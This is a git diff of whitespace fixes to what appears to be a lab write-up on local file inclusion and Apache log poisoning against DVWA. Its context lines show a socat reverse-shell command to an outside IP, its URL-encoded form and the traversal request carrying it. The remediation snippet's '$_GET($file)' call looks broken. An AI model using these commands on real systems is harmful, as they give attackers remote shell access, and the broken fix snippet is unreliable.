@@ -61,7 +61,7 @@ To establish a reverse shell, the tester utilized the following socat command.
 ```bash
  socat tcp-connect:192.168.45.180:1234 exec:bash 
 ``` 
-For the server to correctly interpret and transmit the reverse shell, the URL was encoded as  the following:
+For the server to correctly interpret and transmit the reverse shell, the URL was encoded as the following:
 ```bash
 socat%20tcp-connect%3A192.168.45.180%3A1234%20exec%3Abash
 ```   
@@ -75,7 +75,7 @@ Next, the encoded URL was appended to `/var/log/apache2/access.log` with the `cm
 127.0.0.1/vulnerabilities/fi/?page=../../../../../../../var/log/apache2/access.log&cmd=socattcp-connect%3A192.168.45.180%3A1234exec%3Abash`
  ```
 
-As seen below, the tester successfully received a reverse shell. 
+As seen below, the tester successfully received a reverse shell.
 ![](/assets/lfi/reverseShell.gif)
 
 
@@ -124,7 +124,7 @@ $allowedFiles = array(
 
 $file = $_GET['page'];
 
-// Check if the requested file is in the whitelist
+// Check if the requested file is in the whitelist 
 if (in_array($file, $allowedFiles)) {
     $_GET($file);
 }
